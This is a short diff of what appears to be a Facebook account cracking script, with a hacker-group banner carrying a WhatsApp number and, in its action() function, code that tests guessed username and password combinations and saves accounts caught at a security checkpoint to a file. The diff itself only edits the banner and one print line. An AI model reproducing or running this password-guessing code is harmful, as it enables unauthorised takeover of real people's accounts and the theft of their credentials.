@@ -63,7 +63,7 @@ logo='''
 \x1b[1;97m╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═════╝░
 \x1b[1;93m--------------------------------------------------------------
 \x1b[1;92m➣  YouTube  : CYBER GANGE HIDDEN TRICKER
-\x1b[1;94m➣  Facebook : ARBAB MEMON
+\x1b[1;91m➣  Facebook : ARBAB ALI MEMON
 \x1b[1;93m➣  Note     : CYBER PLAYER R.H.S 1.0286
 \x1b[1;95m➣  Warning  : IF NOT WORK THAN USE FREE VPN
 \x1b[1;96m➣  Whatsapp : +923003023263
@@ -230,7 +230,7 @@ def action():
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1 + '-\x1b[1;93m✙ ' + b['name'] 
+					print '\x1b[1;92mAFTER(3DAYS)🗝\x1b[1;95m-\x1b[1;93m✙\x1b[1;96m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;95m-' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
